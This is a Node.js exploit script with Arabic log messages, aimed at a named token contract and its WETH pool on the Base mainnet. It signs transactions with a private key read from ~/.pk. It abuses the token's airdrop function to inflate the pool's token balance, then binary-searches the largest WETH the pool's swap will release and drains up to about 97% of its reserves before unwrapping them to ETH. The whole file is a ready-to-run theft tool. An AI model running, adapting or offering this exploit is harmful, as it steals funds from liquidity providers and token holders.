import fs from "node:fs";
import { JsonRpcProvider, Wallet, keccak256, concat, zeroPadValue, toBeHex, formatUnits, formatEther } from "ethers";

const R = "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const DRY = process.env.DRY === "1";

const j = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const slot = (a, s) => keccak256(concat([zeroPadValue(a, 32), toBeHex(s, 32)]));
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };
const dec = d => { if (!d || !d.startsWith("0x08c379a0")) return "(بلا نص)"; try { const n = parseInt(d.slice(66, 130), 16); return Buffer.from(d.slice(130, 130 + n * 2), "hex").toString(); } catch { return "?"; } };
const rv0 = async () => (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;

let ME, IS_W0;

async function main() {
  const p = new JsonRpcProvider(R, 8453, { staticNetwork: true });
  const me = new Wallet(fs.readFileSync(process.env.HOME + "/.pk", "utf8").trim(), p);
  ME = me.address;

  const base = BigInt((await j("eth_getBlockByNumber", ["latest", false])).result.baseFeePerGas);
  const mf = base * 6n / 5n + 500000n;
  const FEE = { maxFeePerGas: mf, maxPriorityFeePerGas: 0n };
  const send = async (to, data, gas) => {
    for (let i = 0; i < 3; i++) {
      try { const rc = await (await me.sendTransaction({ to, data, gasLimit: gas, ...FEE })).wait(); if (rc.status === 1) return rc; }
      catch (e) { console.log("   خطأ:", (e.shortMessage || e.message).slice(0, 70)); }
      if (i < 2) await new Promise(r => setTimeout(r, 9000));
    }
    return null;
  };

  const tk0 = "0x" + (await j("eth_call", [{ to: P, data: "0x0dfe1681" }, "latest"])).result.slice(-40).toLowerCase();
  IS_W0 = tk0 === W.toLowerCase();
  if (!IS_W0) { console.log("WETH ليس token0"); return; }
  const mkSwap = o => "0x022c0d9f" + w32(o) + w32(0) + pad(ME) + w32(0x80) + w32(0);
  const mkDrop = amt => "0x983bc41b" + w32(0x60) + pad(ME) + w32(amt) + w32(1) + pad(P);

  const rv = await rv0();
  const rW = BigInt("0x" + rv.slice(2, 66)), rS = BigInt("0x" + rv.slice(66, 130));
  const bal = await bn(T, "0x70a08231" + pad(ME));
  const balP = await bn(T, "0x70a08231" + pad(P));
  const eth = await p.getBalance(ME);
  console.log("ETH:", formatEther(eth), "| SLOP:", formatUnits(bal, 9), "| WETH بالحوض:", formatEther(rW), "| maxFee:", mf.toString());

  const stBal = BigInt((await j("eth_getStorageAt", [T, slot(ME, 1), "latest"])).result || 0);
  console.log("خانة الرصيد 1:", stBal.toString(), stBal === bal ? "✔ مطابقة" : "✘ ليست 1");
  if (rW === 0n) return;

  const tgt = rW * 97n / 100n;
  const IN = (rS * tgt * 1000n / (997n * (rW - tgt)) + 1n) * 110n / 100n;
  console.log("الدخول المخطط:", formatUnits(IN, 9), "SLOP");

  const s1 = await j("eth_call", [{ from: ME, to: T, data: mkDrop(IN), gas: "0x20000" }, "latest"]);
  console.log("airdrop:", s1.error ? "✗ " + dec(s1.error.data) : "✓");
  if (s1.error) return;

  const pA = (90000n + 170000n) * mf;
  const pFull = pA + 55000n * mf;
  const canFull = eth >= pFull;
  const need = canFull ? pFull : pA;
  console.log("غاز:", formatEther(need), "| متاح:", formatEther(eth), canFull ? "" : "(بلا فك WETH)");
  if (eth < need) { console.log("ناقص " + formatEther(need - eth) + " ETH"); return; }
  if (DRY) { console.log("جاهز."); return; }

  console.log("\n1) ضخ الفائض على السلسلة...");
  const before = await bn(T, "0x70a08231" + pad(P));
  if (!await send(T, mkDrop(IN), 90000n)) return;
  let gained = (await bn(T, "0x70a08231" + pad(P))) - before;
  console.log("   زيادة رصيد الحوض:", formatUnits(gained, 9));

  const bisect = async () => {
    const rr = await rv0();
    const w = BigInt("0x" + rr.slice(2, 66)), s = BigInt("0x" + rr.slice(66, 130));
    const cur = (await bn(T, "0x70a08231" + pad(P))) - s;
    if (cur <= 0n) return 0n;
    const th = cur * 997n * w / (s * 1000n + cur * 997n);
    let hi = th < w - 1n ? th : w - 1n, lo = 1n, best = 0n, last = "";
    for (let i = 0; i < 40 && lo <= hi; i++) {
      const mid = (lo + hi) / 2n;
      const r = await j("eth_call", [{ from: ME, to: P, data: mkSwap(mid), gas: "0x2a000" }, "latest"]);
      if (r.error) { last = dec(r.error.data); hi = mid - 1n; } else { best = mid; lo = mid + 1n; }
    }
    if (!best && last) console.log("   آخر رفض:", last);
    return best;
  };

  console.log("2) قياس الحارس على الحالة الحقيقية...");
  let best = await bisect();
  if (!best) {
    console.log("   الحوض يرفض الفائض → sync ثم ضخ ثانٍ");
    if (!await send(P, "0xfff6cae9", 45000n)) return;
    if (!await send(T, mkDrop(IN), 90000n)) return;
    best = await bisect();
  }
  if (!best) { console.log("لا قيمة تمر — أرسل آخر رفض"); return; }
  const out = best * 998n / 1000n;
  console.log("   أقصى مخرج مقبول:", formatEther(best), "WETH (" + (best * 100n / rW).toString() + "% من الاحتياطي)");

  console.log("3) سحب", formatEther(out), "WETH...");
  if (!await send(P, mkSwap(out), 170000n)) return;

  const wb = await bn(W, "0x70a08231" + pad(ME));
  console.log("   WETH عندك:", formatEther(wb));
  if (wb > 0n && canFull) { console.log("4) فك إلى ETH..."); await send(W, "0x2e1a7d4d" + w32(wb), 50000n); }
  console.log("\n>>> ETH عندك:", formatEther(await p.getBalance(ME)), "| WETH عندك:", formatEther(await bn(W, "0x70a08231" + pad(ME))), "| WETH بالحوض:", formatEther(await bn(W, "0x70a08231" + pad(P))));
}
main().catch(e => { console.error("فشل:", e.shortMessage || e.message); process.exit(1); });
